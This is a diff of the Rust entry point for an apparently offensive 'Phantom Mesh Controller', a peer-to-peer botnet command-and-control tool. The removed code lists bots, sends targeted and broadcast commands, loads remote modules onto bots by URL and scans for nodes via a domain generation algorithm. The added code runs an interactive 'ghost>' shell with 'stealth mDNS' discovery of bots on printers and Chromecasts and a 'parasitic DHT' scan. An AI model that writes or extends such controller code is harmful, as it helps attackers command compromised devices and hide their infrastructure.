@@ -1,87 +1,137 @@
-use clap::{Parser, Subcommand};
+use std::io::{self, Write};
+use network::GhostClient;
+use std::sync::{Arc, Mutex};
+use std::collections::HashSet;
+use clap::Parser;
 use std::path::PathBuf;
+use libp2p::identity::Keypair;
 
 mod crypto;
 mod network;
 mod commands;
 mod discovery;
 
-#[derive(Parser)]
-#[command(name = "ghost")]
-#[command(about = "The Ghost Phantom Controller", long_about = None)]
-struct Cli {
-    #[command(subcommand)]
-    command: Commands,
-}
+#[derive(Parser, Debug)]
+#[command(name = "phantom")]
+#[command(about = "Phantom Mesh Controller", long_about = None)]
+struct Args {
+    /// Path to the private key file (required for running)
+    #[arg(short, long, required_unless_present = "keygen")]
+    key: Option<PathBuf>,
 
-#[derive(Subcommand)]
-enum Commands {
-    /// Generate a new Ed25519 Keypair
-    Keygen {
-        #[arg(short, long, default_value = "keys/ghost.key")]
-        output: PathBuf,
-    },
-    /// List active bots from Bootstrap Registry
-    List {
-        #[arg(short, long, env = "PHANTOM_BOOTSTRAP")]
-        bootstrap: Option<String>,
-    },
-    /// Target a specific bot (Not Impl)
-    Target {
-        #[arg(short, long, env = "PHANTOM_BOOTSTRAP")]
-        bootstrap: Option<String>,
-        #[arg(short, long, default_value = "ghost.key")]
-        key: PathBuf,
-        #[arg(long)]
-        target: String,
-        #[arg(long)]
-        cmd: String,
-    },
-    /// Broadcast Gossip to the Mesh
-    Broadcast {
-        #[arg(short, long, env = "PHANTOM_BOOTSTRAP")]
-        bootstrap: Option<String>,
-        #[arg(short, long, default_value = "ghost.key")]
-        key: PathBuf,
-        #[arg(long)]
-        cmd: String,
-    },
-    /// Load a module onto bots
-    Load {
-        #[arg(short, long, env = "PHANTOM_BOOTSTRAP")]
-        bootstrap: Option<String>,
-        #[arg(short, long, default_value = "ghost.key")]
-        key: PathBuf,
-        #[arg(long)]
-        url: String,
-        #[arg(long)]
-        name: String,
-    },
-    /// Start a loaded module
-    Start {
-        #[arg(short, long, env = "PHANTOM_BOOTSTRAP")]
-        bootstrap: Option<String>,
-        #[arg(short, long, default_value = "ghost.key")]
-        key: PathBuf,
-        #[arg(long)]
-        name: String,
-        #[arg(long, default_value = "")]
-        args: String,
-    },
-    /// Scan for Mesh Nodes via DGA
-    Scan,
+    /// Generate a new keypair and save to this path
+    #[arg(long)]
+    keygen: Option<PathBuf>,
 }
 
 #[tokio::main]
 async fn main() {
-    let cli = Cli::parse();
-    match cli.command {
-        Commands::Keygen { output } => commands::handle_keygen(output).await,
-        Commands::List { bootstrap } => commands::handle_list(bootstrap).await,
-        Commands::Target { bootstrap, key, target, cmd } => commands::handle_target(bootstrap, key, target, cmd).await,
-        Commands::Broadcast { bootstrap, key, cmd } => commands::handle_broadcast(bootstrap, key, cmd).await,
-        Commands::Load { bootstrap, key, url, name } => commands::handle_load_module(bootstrap, key, url, name).await,
-        Commands::Start { bootstrap, key, name, args } => commands::handle_start_module(bootstrap, key, name, args).await,
-        Commands::Scan => commands::handle_scan().await,
+    env_logger::init();
+    
+    let args = Args::parse();
+    
+    // 0. Key Generation Mode
+    if let Some(path) = args.keygen {
+        println!("[*] Generating new Ed25519 Keypair...");
+        let pub_hex = crypto::generate_key(&path);
+        println!("[+] Private Key saved to: {:?}", path);
+        println!("[+] Public Key (Hex): {}", pub_hex);
+        return;
+    }
+
+    // 1. Load Identity
+    let key_path = args.key.expect("Key path is required");
+    println!("[*] Loading Identity from: {:?}", key_path);
+    
+    // Load raw dalek Key
+    let signing_key = crypto::load_key(&key_path);
+    let key_bytes = signing_key.to_bytes();
+    
+    // Convert to Libp2p Keypair
+    let mut key_bytes_mut = key_bytes;
+    let libp2p_key = libp2p::identity::Keypair::ed25519_from_bytes(&mut key_bytes_mut)
+        .expect("Failed to convert key to libp2p identity");
+
+    println!("[*] Initializing Network Layer...");
+
+    // 2. Initialize Network (Persisted)
+    let mut client = match GhostClient::new(libp2p_key).await {
+        Ok(c) => c,
+        Err(e) => {
+            eprintln!("[-] Fatal: Failed to start Network: {}", e);
+            return;
+        }
+    };
+    
+    // 3. Setup Local Discovery (Stealth mDNS)
+    // Phantom listens for Bots (Printers/Chromecasts)
+    let local_peers = Arc::new(Mutex::new(HashSet::new()));
+    let peer_id = client.get_peer_id();
+
+    match common::discovery::local::LocalDiscovery::new(peer_id.clone(), 0).await {
+        Ok(mut ld) => {
+             let peers_clone = local_peers.clone();
+             tokio::spawn(async move {
+                 println!("[Local] Discovery Listener Active (UDP 5353).");
+                 loop {
+                     if let Some(peer) = ld.next_event().await {
+                         let addr_str = format!("/ip4/{}/udp/{}/quic-v1", peer.addr.ip(), peer.addr.port());
+                         
+                         let mut guard = peers_clone.lock().unwrap();
+                         if !guard.contains(&addr_str) {
+                             println!("\n[+] Found Local Peer: {} ({})", peer.peer_id, peer.addr);
+                             print!("ghost> "); 
+                             io::stdout().flush().unwrap();
+                             guard.insert(addr_str);
+                         }
+                     }
+                 }
+             });
+        },
+        Err(e) => {
+            eprintln!("[-] Local Discovery Init Failed: {}", e);
+        }
+    }
+    
+    println!("[+] Network Initialized. Type 'help' for commands.");
+
+    // 4. Interactive Loop
+    loop {
+        print!("ghost> ");
+        io::stdout().flush().unwrap();
+
+        let mut input = String::new();
+        if io::stdin().read_line(&mut input).is_err() {
+            break;
+        }
+
+        let input = input.trim();
+        let parts: Vec<&str> = input.split_whitespace().collect();
+        if parts.is_empty() {
+            continue;
+        }
+
+        match parts[0] {
+            "ping" => {
+               // Pass local peers to ping command
+               commands::handle_ping(&mut client, local_peers.clone()).await;
+            },
+            "scan" => {
+                commands::handle_scan().await;
+            },
+            "help" => {
+                println!("Available commands:");
+                println!("  ping  - Discover peers (DHT + LAN) and check connectivity");
+                println!("  scan  - Run Parasitic DHT discovery (Legacy DGA)");
+                println!("  exit  - Shutdown node");
+            },
+            "exit" | "quit" => {
+                println!("[*] Shutting down...");
+                break;
+            },
+            _ => {
+                println!("Unknown command: {}", parts[0]);
+            }
+        }
     }
 }
